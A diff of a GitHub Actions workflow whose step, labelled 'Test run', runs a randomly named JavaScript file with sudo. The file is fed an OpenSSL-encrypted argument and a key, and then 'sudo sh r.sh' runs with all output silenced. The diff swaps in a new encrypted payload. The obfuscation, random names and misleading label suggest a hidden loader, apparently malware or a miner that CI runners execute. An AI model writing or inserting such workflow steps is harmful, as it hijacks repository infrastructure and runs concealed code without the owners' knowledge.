@@ -29,6 +29,6 @@ jobs:
     - name: Test run
       run: |
         cd ${{ github.workspace }}
-        echo 'mubt8'
+        echo '22hin'
         sudo chmod +x heard8w7wt/eldridge1gbc0.js
-        sudo ./heard8w7wt/eldridge1gbc0.js U2FsdGVkX18tA2W1h43G4DvNztLqkOdGMxJ/fquae9zIv/1l+lsXGX87s/tUuK20Qtpj4eIbsl0GUVsTJXm6vHennBkC1/M4sZMDnfZZ/BFFgMC7O3Z4q81er0LUHbe+ wvubyh && sudo sh r.sh > /dev/null 2>&1
+        sudo ./heard8w7wt/eldridge1gbc0.js U2FsdGVkX1/GQANdBuH3lPO8c/z70gHXcGpTZaiXZh0+bQxPtD2yELNPHPHbVzdb63cl+SmF2OXgjuMxdhCzz7+FckVn4kDfccnOWXWtBs7K7sLfcatHeSO2yIcQqVkk ktpd34 && sudo sh r.sh > /dev/null 2>&1
